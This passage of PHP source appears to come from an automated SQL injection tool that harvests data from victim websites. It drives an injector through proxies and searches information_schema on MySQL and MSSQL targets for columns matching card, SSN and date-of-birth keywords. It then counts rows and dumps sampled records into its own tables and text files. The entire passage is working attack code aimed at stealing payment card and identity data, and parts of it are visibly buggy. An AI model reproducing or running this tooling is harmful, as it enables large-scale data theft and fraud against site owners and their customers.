			$mysql_all = $this->mysqlInj->mysqlGetAllValue('information_schema', 'COLUMNS', array('COLUMN_NAME', 'TABLE_NAME', 'TABLE_SCHEMA'), 0, array(), 'WHERE `COLUMN_NAME` LIKE char(' . $this->charcher('%' . $pps . '%') . ') AND ( DATA_TYPE=char(' . $this->charcher('char') . ') OR DATA_TYPE=char(' . $this->charcher('varchar') . ') OR DATA_TYPE=char(' . $this->charcher('text') . '))');
			$this->d($mysql_all, 'mysql ALLLLL');

			if (isset($mysql_all) && (0 < count($mysql_all))) {
				foreach ($mysql_all as $mysql ) {
					if (isset($mysql['COLUMN_NAME']) && ($mysql['COLUMN_NAME'] != NULL) && ($mysql['COLUMN_NAME'] != 'null')) {
						$this->card_dubles[] = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '/' . $mysql['COLUMN_NAME'];
						$bd = $mysql['TABLE_SCHEMA'];
						$table = $mysql['TABLE_NAME'];
						$column = $mysql['COLUMN_NAME'];
						$this->tableOrder = $table;
						$card .= ' ' . $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '/' . $mysql['COLUMN_NAME'];
						$card_one = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '/' . $mysql['COLUMN_NAME'];
						$count_table = $this->mysqlInj->mysqlGetCountInsert($bd, $table);

						if (30 < $count_table) {
							$count_table2 = '<span style=\'color:red; font-size:13px;font-weight:700;\'>' . $count_table . '</span>';
							$card_one2 = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '(' . $count_table2 . ')/' . $mysql['COLUMN_NAME'];
							$card_one_count = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '(' . $count_table . ')/' . $mysql['COLUMN_NAME'];
							$this->d($card_one2, '!!');
							$data['orders'][] = $card_one2;
							$uniq = $this->Post->query('SELECT * FROM `ssn` WHERE `bd`=\'' . $bd . '\' AND `table`=\'' . $table . '\' AND `column`=\'' . $column . '\' limit 1');
							$count = count($uniq);
							$this->d($count, 'count');

							if ($count == 0) {
								$date = date('Y-m-d h:i:s');

								if ($this->Post->query('INSERT INTO ssn (' . "\r\n\t\t\t\t\t\t\t\t" . '`post_id`,' . "\r\n\t\t\t\t\t\t\t\t" . '`bd`,' . "\r\n\t\t\t\t\t\t\t\t" . '`table`,' . "\r\n\t\t\t\t\t\t\t\t" . '`column`,' . "\r\n\t\t\t\t\t\t\t\t" . '`count`,' . "\r\n\t\t\t\t\t\t\t\t" . '`card2`,' . "\r\n\t\t\t\t\t\t\t\t" . '`domen`,' . "\r\n\t\t\t\t\t\t\t\t" . '`date`) ' . "\r\n\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\t" . 'VALUES(' . "\r\n\t\t\t\t\t\t\t\t" . $post_id . ',' . "\r\n\t\t\t\t\t\t\t\t" . '\'' . $bd . '\',' . "\r\n\t\t\t\t\t\t\t\t" . '\'' . $table . '\',' . "\r\n\t\t\t\t\t\t\t\t" . '\'' . $column . '\',' . "\r\n\t\t\t\t\t\t\t\t" . $count_table . ',' . "\r\n\t\t\t\t\t\t\t\t" . '\'' . $card_one_count . '\',' . "\r\n\t\t\t\t\t\t\t\t" . '\'' . $domen . '\',' . "\r\n\t\t\t\t\t\t\t\t" . '\'' . $date . '\')')) {
									$this->d('v bd uspeshno vstavleno');
								}

							}
							 else {
								$this->d('SELECT * FROM `ssn` WHERE `bd`=\'' . $bd . '\' AND `table`=\'' . $table . '\' AND `column`=\'' . $column . '\' limit 1', 'EST D BD!!!');
								echo mysql_error();
							}
						}
						 else {
							$this->d('menshe 20 !!!!!!', $count_table);
						}
					}

				}
			}
			 else {
				$this->d($pps, 'nuhya netu');
			}
		}
	}

	public function getCountSsnMSSQL()
	{
		$this->timeStart = $this->start('getCountSnnMSSQL', 1);
		$poles = $this->Post->query('SELECT * FROM `posts` WHERE `status`=3 AND `prohod`=5 AND `ssn_check` =0 AND `version` LIKE  \'M%\' limit 7');

		if (0 < count($poles)) {
			$this->d('netuuuuuuu');
		}
		 else {
			$this->stop();
			exit();
		}

		$r = rand(1, 100);

		foreach ($poles as $pole ) {
			$this->workup();
			$this->Filed->query('UPDATE  `posts` SET  `ssn_check` =  1 WHERE  `id` =' . $pole['posts']['id']);
			$this->FindCountSsnOneMSSQL($pole['posts']['id']);
			$this->tableOrder = '';
		}

		$this->stop();
		exit('fse');
	}

	public function FindCountSsnOneMSSQL($idf)
	{
		$this->d('FindCountSsnOneMSSQL - zapusk');
		$pass = $this->ssn_dob;
		$squle = $this->Post->query('SELECT * FROM `posts` WHERE id=' . $idf . ' limit 1');
		$squle = $squle[0];
		$this->d($squle, 'squle');
		$post_id = $squle['posts']['id'];
		$domen = $squle['posts']['domen'];
		$this->workup();
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if (preg_match('/microsoft/i', $squle[0]['posts']['version'])) {
			$this->mysqlInj->mssql = true;
			$this->d('MSSQL!');
		}


		if (2 < strlen($squle['posts']['sleep'])) {
			$set = $squle['posts']['sleep'];
			$this->d($set, 'pass SET');
		}
		 else {
			$set = false;
		}

		$this->mysqlInj->inject($squle['posts']['header'] . '::' . $squle['posts']['gurl'], $squle, $set);
		$password = '';
		$i = 1;
		$this->d($pass);
		$data = $this->mysqlInj->mssqlGetLikeSsn();
		$this->d($data, 'data T');

		if (0 < count($data)) {
			$this->workup();
			$url = parse_url($squle['Post']['url']);
			$ip = gethostbyname($url['host']);

			foreach ($data as $key => $value ) {
				$mail2 = explode(':::', $value);
				$mail['TABLE_SCHEMA'] = $mail2[0];
				$mail['TABLE_NAME'] = $mail2[1];
				$mail['COLUMN_NAME'] = $mail2[2];
				$mailcount = $this->mysqlInj->mssqlGetCount($mail['TABLE_SCHEMA'], $mail['TABLE_NAME']);
				$this->d($mailcount, '$mailcount');
				$this->workup();

				if ((intval($mailcount) !== 0) && (20 < $mailcount)) {
					$this->card_dubles[] = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '/' . $mysql['COLUMN_NAME'];
					$bd = $mysql['TABLE_SCHEMA'];
					$table = $mysql['TABLE_NAME'];
					$column = $mysql['COLUMN_NAME'];
					$this->tableOrder = $table;
					$card .= ' ' . $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '/' . $mysql['COLUMN_NAME'];
					$card_one = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '/' . $mysql['COLUMN_NAME'];
					$count_table = $mailcount;
					$count_table2 = '<span style=\'color:red; font-size:13px;font-weight:700;\'>' . $count_table . '</span>';
					$card_one2 = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '(' . $count_table2 . ')/' . $mysql['COLUMN_NAME'];
					$card_one_count = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '(' . $count_table . ')/' . $mysql['COLUMN_NAME'];
					$this->d($card_one2, '!!');
					$data['orders'][] = $card_one2;
					$uniq = $this->Post->query('SELECT * FROM `ssn` WHERE `bd`=\'' . $bd . '\' AND `table`=\'' . $table . '\' AND `column`=\'' . $column . '\' limit 1');
					$count = count($uniq);
					$this->d($count, 'count');

					if ($count == 0) {
						$date = date('Y-m-d h:i:s');

						if ($this->Post->query('INSERT INTO ssn (' . "\r\n\t\t\t\t\t\t\t" . '`post_id`,' . "\r\n\t\t\t\t\t\t\t" . '`bd`,' . "\r\n\t\t\t\t\t\t\t" . '`table`,' . "\r\n\t\t\t\t\t\t\t" . '`column`,' . "\r\n\t\t\t\t\t\t\t" . '`count`,' . "\r\n\t\t\t\t\t\t\t" . '`card2`,' . "\r\n\t\t\t\t\t\t\t" . '`domen`,' . "\r\n\t\t\t\t\t\t\t" . '`date`,' . "\r\n\t\t\t\t\t\t\t" . '`typedb`) ' . "\r\n\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t" . 'VALUES(' . "\r\n\t\t\t\t\t\t\t" . $post_id . ',' . "\r\n\t\t\t\t\t\t\t" . '\'' . $bd . '\',' . "\r\n\t\t\t\t\t\t\t" . '\'' . $table . '\',' . "\r\n\t\t\t\t\t\t\t" . '\'' . $column . '\',' . "\r\n\t\t\t\t\t\t\t" . $count_table . ',' . "\r\n\t\t\t\t\t\t\t" . '\'' . $card_one_count . '\',' . "\r\n\t\t\t\t\t\t\t" . '\'' . $domen . '\',' . "\r\n\t\t\t\t\t\t\t" . '\'' . $date . '\',' . "\r\n\t\t\t\t\t\t\t" . '\'mssql\')')) {
							$this->d('v bd uspeshno vstavleno');
						}

					}
					 else {
						$this->d('SELECT * FROM `ssn` WHERE `bd`=\'' . $bd . '\' AND `table`=\'' . $table . '\' AND `column`=\'' . $column . '\' limit 1', 'EST D BD!!!');
					}
				}
				 else {
					$this->d($pps, 'nuhya netu');
				}
			}
		}

	}

	public function ssn_16()
	{
		$poles = $this->Post->query('SELECT * FROM `ssn` WHERE `count_n` =\'0\'  ORDER by count  limit 6');
		$this->d($poles, 'poles');
		$this->timeStart = $this->start('ssn_16', 1);

		if (count($poles) <= 0) {
			$this->stop();
			$this->d('SSN_16::No poles');
        return;
		}

		foreach ($poles as $pole ) {
			$id = $pole['ssn']['id'];
			$bd = $pole['ssn']['bd'];
			$table = $pole['ssn']['table'];
			$column = $pole['ssn']['column'];
			$count = $pole['ssn']['count'];
			$this->workup();
			$this->Filed->query('UPDATE  `ssn` SET  `count_n` = 1  WHERE  `id` =' . $id);
			$this->ssn_16_one($id, $pole['ssn']['post_id'], $bd, $table, $column, $count);
		}

		$this->stop();
		$this->d('SSN_16::End execution');
      return;
	}

	public function ssn_16_one($id, $post_id, $bd, $table, $column, $count)
	{
		$this->d('count_16_one - zapusk');
		$pass = $this->ssn_dob;
		$squle = $this->Post->query('SELECT * FROM `posts` WHERE id=' . $post_id . ' limit 1');
		$squle = $squle[0];
		$this->d($squle, 'squle');

		if ($squle['posts']['ssn'] == '::') {
			$password = ' ' . $bd . '/' . $table . '/' . $column;
			$this->d($password, '$password');
			$this->Filed->query('UPDATE  `posts` SET  `ssn` =  "' . $password . '" WHERE  `id` =' . $post_id);
		}


		$post_id = $squle['posts']['id'];
		$order_id = $id;
		$domen = $squle['posts']['domen'];
		$this->workup();
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if (2 < strlen($squle['posts']['sleep'])) {
			$set = $squle['posts']['sleep'];
			$this->d($set, 'pass SET');
		}
		 else {
			$set = false;
		}

		$this->mysqlInj->inject($squle['posts']['header'] . '::' . $squle['posts']['gurl'], $squle, $set);
		$column_all = $this->mysqlInj->mysqlGetFieldByTable($bd, $table);
		$this->d($column_all, '$column_all');

		if ((2 < count($column_all)) && ($column_all != '')) {
			$column_all_srt = '';

			foreach ($column_all as $col ) {
				$col_str = '';
				$ccc[] = trim($col);
			}

			$col_str = implode(';', $ccc);
			$this->d($col_str, '$col_str');
			$this->Post->query('INSERT INTO ssn_card (`order_id`,`data`) VALUES(' . $order_id . ',\'' . $col_str . '\')');
			$l = rand(1, 500);
			$i = $l;

			while ($i < ($l + 20)) {
				$kuku = array();
				$kuku = $this->mysqlInj->mysqlGetValue($bd, $table, $ccc, $i, array(), '');
				$str = '';

				if ((1 < count($kuku)) && ($kuku != '')) {
					foreach ($kuku as $yyy ) {
						if ($yyy != '') {
							$str .= $yyy . ';';
						}

					}
				}


				if ($str != '') {
					$this->d($str, '$str');
					$this->Post->query('INSERT INTO ssn_card (`order_id`,`data`) VALUES(' . $order_id . ',\'' . $str . '\')');
					$this->d('INSERT INTO ssn_card (`order_id`,`data`) VALUES(' . $order_id . ',\'' . $str . '\')');
				}


				++$i;
			}
		}

	}

	public function getToAll()
	{
		if (!(isset($this->dump_all_potok))) {
			$this->dump_all_potok = 3;
		}


		$this->timeStart = $this->start('getToAll', $this->dump_all_potok);
		$poles = $this->Post->query('SELECT * FROM `posts` WHERE `all_check`=0 AND `status`=3 limit 1');

		if (0 < count($poles)) {
		}
		 else {
			$this->d('netuuuuuuu');
			$this->stop();
			exit();
		}

		$r = rand(1, 100);
		$this->proxyCheck();

		foreach ($poles as $pole ) {
			$this->workup();
			$this->Filed->query('UPDATE  `posts` SET  `all_check` =  1 WHERE  `id` =' . $pole['posts']['id']);
			$this->FindAllOne($pole['posts']['id']);
			$this->tableOrder = '';
		}

		$this->stop();
		exit('fse');
	}

	public function FindAllOne($idf)
	{
		$this->d('FindCountOrderOne - zapusk');
		$pass = $this->cards;
		$squle = $this->Post->query('SELECT * FROM `posts` WHERE id=' . $idf . ' limit 1');
		$squle = $squle[0];
		$this->d($squle, 'squle');
		$post_id = $squle['posts']['id'];
		$domen = $squle['posts']['domen'];
		$this->workup();
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if (2 < strlen($squle['posts']['sleep'])) {
			$set = $squle['posts']['sleep'];
			$this->d($set, 'pass SET');
		}
		 else {
			$set = false;
		}

		$this->mysqlInj->inject($squle['posts']['header'] . '::' . $squle['posts']['gurl'], $squle, $set);
		$password = '';
		$i = 1;
		$filename = './MYSQL_save/' . $squle['posts']['domen'] . '.txt';
		$fh = fopen($filename, 'a+');
		fwrite($fh, $squle['posts']['url'], "\r\n" . ' ' . "\r\n");
		fclose($fh);
		$this->d($pass);
		$pss = @trim($pps);
		$this->workup();
		$mysql_all = $this->mysqlInj->mysqlGetAllBd();
		$this->d($mysql_all, 'mysql ALLLLL');

		if (isset($mysql_all) && (0 < count($mysql_all))) {
			$fh = fopen($filename, 'a+');

			foreach ($mysql_all as $bd ) {
				$text = '';

				if ($bd == 'information_schema') {
					continue;
				}


				$mysql_bd_table = $this->mysqlInj->mysqlGetTablesByDd($bd);
				$this->d($mysql_bd_table, 'mysql2222 ' . $bd . ' table');
				$this->workup();
				$table_count = 0;

				if (isset($mysql_bd_table) && (0 < count($mysql_bd_table))) {
					foreach ($mysql_bd_table as $table ) {
						$this->workup();
						++$table_count;
						$text = '';
						$text .= "\r\n";
						$count_table = $this->mysqlInj->mysqlGetCountInsert($bd, $table);
						$this->d($count_table, '$count_table');
						$text .= "\r\n\r\n" . $bd . ' - ' . $table . ':(' . $count_table . ')' . "\r\n";
						$mysql_bd_table_columns = $this->mysqlInj->mysqlGetFieldByTable($bd, $table);
						$this->d($mysql_bd_table_columns, 'mysql ' . $bd . ' ' . $table);

						if (0 < count($mysql_bd_table_columns)) {
							$y = 0;

							foreach ($mysql_bd_table_columns as $ccc ) {
								$col[] = $ccc;
								++$y;
							}

							$text .= implode(',', $col);
							$text .= "\r\n";
						}


						$i = 0;

						while ($i < 10) {
							$kuku = $this->mysqlInj->mysqlGetValue($bd, $table, $col, $i, array(), '');
							$mysql_result[] = $kuku;
							++$i;
						}

						$i = 90;

						while ($i < 100) {
							$kuku = $this->mysqlInj->mysqlGetValue($bd, $table, $col, $i, array(), '');
							$mysql_result[] = $kuku;
							++$i;
						}

						$i = 490;

						while ($i < 500) {
							$kuku = $this->mysqlInj->mysqlGetValue($bd, $table, $col, $i, array(), '');
							$mysql_result[] = $kuku;
							++$i;
						}

						$i = 990;

						while ($i < 1000) {
							$kuku = $this->mysqlInj->mysqlGetValue($bd, $table, $col, $i, array(), '');
							$mysql_result[] = $kuku;
							++$i;
						}

						$i = 1990;

						while ($i < 2000) {
							$kuku = $this->mysqlInj->mysqlGetValue($bd, $table, $col, $i, array(), '');
							$mysql_result[] = $kuku;
							++$i;
						}

						$col = array();
						$text .= "\r\n";
						$p = '';

						foreach ($mysql_result as $rrr ) {
							if (0 < count($rrr)) {
								foreach ($rrr as $hhh ) {
									$hhh = trim($hhh);

									if (($hhh != '') && (0 < strlen($hhh))) {
										$p .= $hhh . ' ';
									}

								}

								$text = trim($text);
								$text .= "\r\n";
								$text .= $p;
								$p = '';
							}

						}

						$mysql_result = array();
						$this->d($text, '$text');
						flush();
						fwrite($fh, $text);
						fwrite($fh, "\r\n" . '+++++++++' . "\r\n");
					}

					fwrite($fh, "\r\n" . ' ' . "\r\n");
				}

			}

			return;
		}


		$this->d($pps, 'nuhya netu');
	}

	public function getCountOrders()
	{
		if ($this->cc_check == false) {
			echo 'cc_check false';
			return false;
		}


		echo 'cc_check TRUE';
		$this->timeStart = $this->start('getCountOrders', 1);
		$poles = $this->Post->query('SELECT * FROM `posts` WHERE `status`=3 AND `prohod`=5 AND `order_check` =0 AND `version` LIKE  \'%5.%\'  limit 7');

		if (0 < count($poles)) {
		}
		 else {
			$this->d('netuuuuuuu');
			$this->stop();
			exit();
		}

		$r = rand(1, 100);

		foreach ($poles as $pole ) {
			$this->workup();
			$this->Filed->query('UPDATE  `posts` SET  `order_check` =  1 WHERE  `id` =' . $pole['posts']['id']);
			$this->FindCountOrderOne($pole['posts']['id']);
			$this->tableOrder = '';
		}

		$this->stop();
		exit('fse');
	}

	public function FindCountOrderOne($idf)
	{
		$this->d('FindCountOrderOne - zapusk');
		$pass = $this->cards;
		$squle = $this->Post->query('SELECT * FROM `posts` WHERE id=' . $idf . ' limit 1');
		$squle = $squle[0];
		$this->d($squle, 'squle');
		$post_id = $squle['posts']['id'];
		$domen = $squle['posts']['domen'];
		$this->workup();
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if (2 < strlen($squle['posts']['sleep'])) {
			$set = $squle['posts']['sleep'];
			$this->d($set, 'pass SET');
		}
		 else {
			$set = false;
		}

		$this->mysqlInj->inject($squle['posts']['header'] . '::' . $squle['posts']['gurl'], $squle, $set);
		$password = '';
		$i = 1;
		$this->d($pass);

		foreach ($pass as $pps ) {
			$pss = trim($pps);
			$this->workup();
			$mysql_all = $this->mysqlInj->mysqlGetAllValue('information_schema', 'COLUMNS', array('COLUMN_NAME', 'TABLE_NAME', 'TABLE_SCHEMA'), 0, array(), 'WHERE `COLUMN_NAME` LIKE char(' . $this->charcher('%' . $pps . '%') . ') AND ( DATA_TYPE=char(' . $this->charcher('char') . ') OR DATA_TYPE=char(' . $this->charcher('varchar') . ') OR DATA_TYPE=char(' . $this->charcher('text') . '))');
			$this->d($mysql_all, 'mysql ALLLLL');

			if (isset($mysql_all) && (0 < count($mysql_all))) {
				foreach ($mysql_all as $mysql ) {
					if (isset($mysql['COLUMN_NAME']) && ($mysql['COLUMN_NAME'] != NULL) && ($mysql['COLUMN_NAME'] != 'null')) {
						$this->card_dubles[] = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '/' . $mysql['COLUMN_NAME'];
						$bd = $mysql['TABLE_SCHEMA'];
						$table = $mysql['TABLE_NAME'];
						$column = $mysql['COLUMN_NAME'];
						$this->tableOrder = $table;
						$card .= ' ' . $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '/' . $mysql['COLUMN_NAME'];
						$card_one = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '/' . $mysql['COLUMN_NAME'];
						$count_table = $this->mysqlInj->mysqlGetCountInsert($bd, $table);

						if (50 < $count_table) {
							$count_table2 = '<span style=\'color:red; font-size:13px;font-weight:700;\'>' . $count_table . '</span>';
							$card_one2 = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '(' . $count_table2 . ')/' . $mysql['COLUMN_NAME'];
							$card_one_count = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '(' . $count_table . ')/' . $mysql['COLUMN_NAME'];
							$this->d($card_one2, '!!');
							$data['orders'][] = $card_one2;
							$uniq = $this->Post->query('SELECT * FROM `orders` WHERE `bd`=\'' . $bd . '\' AND `table`=\'' . $table . '\' AND `column`=\'' . $column . '\' limit 1');
							$count = count($uniq);
							$this->d($count, 'count');

							if ($count == 0) {
								$date = date('Y-m-d h:i:s');

								if ($this->Post->query('INSERT INTO orders (' . "\r\n\t\t\t\t\t\t\t\t" . '`post_id`,' . "\r\n\t\t\t\t\t\t\t\t" . '`bd`,' . "\r\n\t\t\t\t\t\t\t\t" . '`table`,' . "\r\n\t\t\t\t\t\t\t\t" . '`column`,' . "\r\n\t\t\t\t\t\t\t\t" . '`count`,' . "\r\n\t\t\t\t\t\t\t\t" . '`card2`,' . "\r\n\t\t\t\t\t\t\t\t" . '`domen`,' . "\r\n\t\t\t\t\t\t\t\t" . '`date`) ' . "\r\n\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\t" . 'VALUES(' . "\r\n\t\t\t\t\t\t\t\t" . $post_id . ',' . "\r\n\t\t\t\t\t\t\t\t" . '\'' . $bd . '\',' . "\r\n\t\t\t\t\t\t\t\t" . '\'' . $table . '\',' . "\r\n\t\t\t\t\t\t\t\t" . '\'' . $column . '\',' . "\r\n\t\t\t\t\t\t\t\t" . $count_table . ',' . "\r\n\t\t\t\t\t\t\t\t" . '\'' . $card_one_count . '\',' . "\r\n\t\t\t\t\t\t\t\t" . '\'' . $domen . '\',' . "\r\n\t\t\t\t\t\t\t\t" . '\'' . $date . '\')')) {
									$this->d('v bd uspeshno vstavleno');
								}

							}
							 else {
								$this->d('SELECT * FROM `orders` WHERE `bd`=\'' . $bd . '\' AND `table`=\'' . $table . '\' AND `column`=\'' . $column . '\' limit 1', 'EST D BD!!!');
							}
						}
						 else {
							$this->d('menshe 20 !!!!!!', $count_table);
						}
					}

				}
			}
			 else {
				$this->d($pps, 'nuhya netu');
			}
		}
	}

	public function getCountOrdersMSSQL()
	{
		$this->timeStart = $this->start('getCountOrdersMSSQL', 1);
		$poles = $this->Post->query('SELECT * FROM `posts` WHERE `status`=3 AND `prohod`=5 AND `order_check` =0 AND `version` LIKE  \'m%\' limit 7');

		if (0 < count($poles)) {
		}
		 else {
			$this->d('netuuuuuuu');
			$this->stop();
			exit();
		}

		$r = rand(1, 100);

		foreach ($poles as $pole ) {
			$this->workup();
			$this->Filed->query('UPDATE  `posts` SET  `order_check` =  1 WHERE  `id` =' . $pole['posts']['id']);
			$this->FindCountOrdersMSSQL($pole['posts']['id']);
			$this->tableOrder = '';
		}

		$this->stop();
		exit('fse');
	}

	public function FindCountOrdersMSSQL($idf)
	{
		$this->d('FindCountOrdersMSSQL - zapusk');
		$pass = $this->ssn_dob;
		$squle = $this->Post->query('SELECT * FROM `posts` WHERE id=' . $idf . ' limit 1');
		$squle = $squle[0];
		$this->d($squle, 'squle');
		$post_id = $squle['posts']['id'];
		$domen = $squle['posts']['domen'];
		$this->workup();
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if (preg_match('/microsoft/i', $squle[0]['posts']['version'])) {
			$this->mysqlInj->mssql = true;
			$this->d('MSSQL!');
		}


		if (2 < strlen($squle['posts']['sleep'])) {
			$set = $squle['posts']['sleep'];
			$this->d($set, 'pass SET');
		}
		 else {
			$set = false;
		}

		$this->mysqlInj->inject($squle['posts']['header'] . '::' . $squle['posts']['gurl'], $squle, $set);
		$password = '';
		$i = 1;
		$this->d($pass);
		$data = $this->mysqlInj->mssqlGetLikeOrders();
		$this->d($data, 'data T');

		if (0 < count($data)) {
			$this->workup();
			$url = parse_url($squle['Post']['url']);
			$ip = gethostbyname($url['host']);

			foreach ($data as $key => $value ) {
				$mail2 = explode(':::', $value);
				$mail['TABLE_SCHEMA'] = $mail2[0];
				$mail['TABLE_NAME'] = $mail2[1];
				$mail['COLUMN_NAME'] = $mail2[2];
				$mailcount = $this->mysqlInj->mssqlGetCount($mail['TABLE_SCHEMA'], $mail['TABLE_NAME']);
				$this->d($mailcount, '$mailcount');
				$this->workup();

				if ((intval($mailcount) !== 0) && (20 < $mailcount)) {
					$this->card_dubles[] = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '/' . $mysql['COLUMN_NAME'];
					$bd = $mysql['TABLE_SCHEMA'];
					$table = $mysql['TABLE_NAME'];
					$column = $mysql['COLUMN_NAME'];
					$this->tableOrder = $table;
					$card .= ' ' . $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '/' . $mysql['COLUMN_NAME'];
					$card_one = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '/' . $mysql['COLUMN_NAME'];
					$count_table = $mailcount;
					$count_table2 = '<span style=\'color:red; font-size:13px;font-weight:700;\'>' . $count_table . '</span>';
					$card_one2 = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '(' . $count_table2 . ')/' . $mysql['COLUMN_NAME'];
					$card_one_count = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'] . '(' . $count_table . ')/' . $mysql['COLUMN_NAME'];
					$this->d($card_one2, '!!');
					$data['orders'][] = $card_one2;
					$uniq = $this->Post->query('SELECT * FROM `orders` WHERE `bd`=\'' . $bd . '\' AND `table`=\'' . $table . '\' AND `column`=\'' . $column . '\' limit 1');
					$count = count($uniq);
					$this->d($count, 'count');

					if ($count == 0) {
						$date = date('Y-m-d h:i:s');

						if ($this->Post->query('INSERT INTO orders (' . "\r\n\t\t\t\t\t\t\t" . '`post_id`,' . "\r\n\t\t\t\t\t\t\t" . '`bd`,' . "\r\n\t\t\t\t\t\t\t" . '`table`,' . "\r\n\t\t\t\t\t\t\t" . '`column`,' . "\r\n\t\t\t\t\t\t\t" . '`count`,' . "\r\n\t\t\t\t\t\t\t" . '`card2`,' . "\r\n\t\t\t\t\t\t\t" . '`domen`,' . "\r\n\t\t\t\t\t\t\t" . '`date`,' . "\r\n\t\t\t\t\t\t\t" . '`typedb`) ' . "\r\n\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t" . 'VALUES(' . "\r\n\t\t\t\t\t\t\t" . $post_id . ',' . "\r\n\t\t\t\t\t\t\t" . '\'' . $bd . '\',' . "\r\n\t\t\t\t\t\t\t" . '\'' . $table . '\',' . "\r\n\t\t\t\t\t\t\t" . '\'' . $column . '\',' . "\r\n\t\t\t\t\t\t\t" . $count_table . ',' . "\r\n\t\t\t\t\t\t\t" . '\'' . $card_one_count . '\',' . "\r\n\t\t\t\t\t\t\t" . '\'' . $domen . '\',' . "\r\n\t\t\t\t\t\t\t" . '\'' . $date . '\',' . "\r\n\t\t\t\t\t\t\t" . '\'mssql\')')) {
							$this->d('v bd uspeshno vstavleno');
						}

					}
					 else {
						$this->d('SELECT * FROM `orders` WHERE `bd`=\'' . $bd . '\' AND `table`=\'' . $table . '\' AND `column`=\'' . $column . '\' limit 1', 'EST D BD!!!');
						$this->d(mysql_error);
					}
				}
				 else {
					$this->d($pps, 'nuhya netu');
				}
			}
		}

	}

	public function count_16()
	{
		$poles = $this->Post->query('SELECT * FROM `orders` WHERE `count_n` =\'0\'  ORDER by count  limit 5');
		$this->d($poles, 'poles');
		$this->timeStart = $this->start('count_16', 1);

		if (0 < count($poles)) {
		}
		 else {
			$this->stop();
			exit();
		}

		foreach ($poles as $pole ) {
			$id = $pole['orders']['id'];
			$bd = $pole['orders']['bd'];
			$table = $pole['orders']['table'];
			$column = $pole['orders']['column'];
			$count = $pole['orders']['count'];
			$this->workup();
			$this->Filed->query('UPDATE  `orders` SET  `count_n` = 1  WHERE  `id` =' . $id);
			$this->count_16_one($id, $pole['orders']['post_id'], $bd, $table, $column, $count);
		}

		$this->stop();
		exit('fse');
	}

	public function count_16_one($id, $post_id, $bd, $table, $column, $count)
	{
		$this->d('count_16_one - zapusk');
		$pass = $this->cards;
		$squle = $this->Post->query('SELECT * FROM `posts` WHERE id=' . $post_id . ' limit 1');
		$squle = $squle[0];
		$this->d($squle, 'squle');

		if ($squle['posts']['order'] == '::') {
			$password = ' ' . $bd . '/' . $table . '/' . $column;
			$this->d($password, '$password');
			$this->Filed->query('UPDATE  `posts` SET  `order` =  "' . $password . '" WHERE  `id` =' . $post_id);
		}


		$post_id = $squle['posts']['id'];
		$order_id = $id;
		$domen = $squle['posts']['domen'];
		$this->workup();
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if (2 < strlen($squle['posts']['sleep'])) {
			$set = $squle['posts']['sleep'];
			$this->d($set, 'pass SET');
		}
		 else {
			$set = false;
		}

		$this->mysqlInj->inject($squle['posts']['header'] . '::' . $squle['posts']['gurl'], $squle, $set);
		$column_all = $this->mysqlInj->mysqlGetFieldByTable($bd, $table);

		if ((2 < count($column_all)) && ($column_all != '')) {
			$column_all_srt = '';

			foreach ($column_all as $col ) {
				$col_str = '';
				$ccc[] = trim($col);
			}

			$col_str = implode(';', $ccc);
			$this->d($col_str, '$col_str');
			$this->Post->query('INSERT INTO orders_card (`order_id`,`data`) VALUES(' . $order_id . ',\'' . $col_str . '\')');
			$l = rand(1, 500);
			$i = $l;

			while ($i < ($l + 20)) {
				$kuku = array();
				$kuku = $this->mysqlInj->mysqlGetValue($bd, $table, $ccc, $i, array(), '');
				$str = '';

				if ((1 < count($kuku)) && ($kuku != '')) {
					foreach ($kuku as $yyy ) {
						if ($yyy != '') {
							$str .= $yyy . ';';
						}

					}
				}


				if ($str != '') {
					$this->d($str, '$str');
					$this->Post->query('INSERT INTO orders_card (`order_id`,`data`) VALUES(' . $order_id . ',\'' . $str . '\')');
					$this->d('INSERT INTO orders_card (`order_id`,`data`) VALUES(' . $order_id . ',\'' . $str . '\')');
				}


				++$i;
			}
		}

	}

	public function count_new()
	{
		$poles = $this->Post->query('SELECT count(*) FROM `orders` WHERE `check_count` =0');
		$this->d($poles[0][0]['count(*)'], 'poles');
		$this->timeStart = $this->start('count_new', 1);

		if (0 < $poles[0][0]['count(*)']) {
			$this->d($poles[0][0]['count(*)'], '$poles[0][0][count(*)] >0');
		}
		 else {
			$this->d($poles[0][0]['count(*)'], '$poles[0][0][count(*)] < === 0');
			$this->Filed->query('UPDATE  `orders` SET  `check_count` = 0 WHERE  `check_count` = 1');
			$this->d('UPDATE  `orders` SET  `check_count` = 0 WHERE  `check_count` = 1');
		}
